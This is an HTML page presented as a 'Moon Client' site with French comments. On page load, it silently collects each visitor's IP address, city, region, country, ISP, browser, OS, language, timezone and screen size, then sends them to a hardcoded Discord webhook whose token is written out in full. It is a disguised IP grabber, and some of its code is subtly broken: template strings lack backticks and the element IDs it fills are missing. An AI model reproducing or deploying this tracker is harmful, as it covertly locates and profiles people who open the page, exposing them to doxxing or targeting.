<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moon Client</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
        }

        .container {
            text-align: center;
            max-width: 400px;
            padding: 20px;
            background: #fff;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        #logo {
            width: 100px;
            margin-bottom: 20px;
        }

        #info {
            margin-top: 20px;
            text-align: left;
        }

        .error {
            color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <img id="logo" src="https://files.catbox.moe/imzkkq.png" alt="Logo du site">
        <h1>NaN</h1>
        <div id="info">
            <p>Hey</p>
            <p class="error" id="error"></p>
        </div>
    </div>
    <audio id="audio" src="https://files.catbox.moe/cuh0ir.mp3"></audio> <!-- Chemin vers le fichier audio -->
    <script>
        // Jouer le son automatiquement
        window.onload = () => {
            const audio = document.getElementById('audio');
            audio.play().catch(error => {
                console.error("L'autoplay a √©t√© bloqu√© par le navigateur : ", error);
            });
        };

        (async () => {
            try {
                // R√©cup√©rer l'IP et les informations g√©ographiques avec ipwhois.app
                const response = await fetch('https://ipwhois.app/json/');
                if (!response.ok) throw new Error("Erreur lors de la r√©cup√©ration des informations");
                const data = await response.json();

                // R√©cup√©rer les informations du navigateur
                const userAgent = navigator.userAgent;
                const browserName = navigator.appName;
                const browserVersion = navigator.appVersion;
                const currentDateTime = new Date().toLocaleString();

                // R√©cup√©rer des informations suppl√©mentaires
                const language = navigator.language || navigator.userLanguage;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const screenResolution = ${window.screen.width}x${window.screen.height};
                const platform = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                // Afficher les informations sur la page
                document.getElementById('ip').textContent = data.ip;
                document.getElementById('browser').textContent = ${browserName} ${browserVersion};
                document.getElementById('datetime').textContent = currentDateTime;
                document.getElementById('location').textContent = ${data.city}, ${data.region}, ${data.country};
                document.getElementById('language').textContent = language;
                document.getElementById('timezone').textContent = timezone;
                document.getElementById('screenResolution').textContent = screenResolution;
                document.getElementById('platform').textContent = platform;

                // Pr√©parer les informations pour l'embed Discord
                const embed = {
                    embeds: [
                        {
                            title: "Nouvelle Connection d√©tect√©e ",
                            description: "D√©tails de la connexion",
                            color: 3447003,
                            fields: [
                                { name: "üìç Adresse IP", value: data.ip, inline: true },
                                { name: "‚åõ Date et Heure", value: currentDateTime, inline: true },
                                { name: "‚õµ Navigateur", value: ${browserName} ${browserVersion}, inline: true },
                                { name: "üïµÔ∏è Syst√®me d'Exploitation", value: userAgent, inline: false },
                                { name: "üåé Localisation", value: ${data.city}, ${data.region}, ${data.country}, inline: true },
                                { name: "üè≥Ô∏è Langue", value: language, inline: true },
                                { name: "‚è∞ Fuseau Horaire", value: timezone, inline: true },
                                { name: "üíæ R√©solution d'√©cran", value: screenResolution, inline: true },
                                { name: "üíª Type de plateforme", value: platform, inline: true },
                                { name: "üß® Fournisseur d'Acc√®s Internet (ISP)", value: data.isp, inline: false }
                            ]
                        }
                    ]
                };

                // Envoyer l'embed au webhook Discord
                const webhookURL = "https://canary.discord.com/api/webhooks/1302054574017744967/OEnw6A4oshNCK9xBC6CT7coh_EkFMI47BeTr-LuFp3EoR_w20bDeNpI2UZqyVFcC66MY";
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embed)
                });
            } catch (error) {
                // Afficher le message d'erreur dans la page
                document.getElementById('error').textContent = error.message;
                console.error(error);
            }
        })();
    </script>
</body>
</html>
